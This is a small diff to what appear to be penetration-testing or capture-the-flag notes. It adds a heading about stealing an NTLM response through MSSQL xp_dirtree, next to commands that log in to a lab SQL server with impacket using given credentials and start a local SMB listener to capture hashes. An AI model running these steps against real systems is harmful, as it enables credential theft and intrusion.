@@ -67,6 +67,8 @@ Login MS SQL with impacket:
 sudo impacket-mssqlclient PublicUser:"GuestUserCantWrite1"@10.10.11.202 -p 1433 -debug
 ```
 
+### Steal NTLM Response through MSSQL xp_dirtree
+
 Create your own local SMB listener server with impacket:
 ```
 sudo impacket-smbserver . . -smb2support
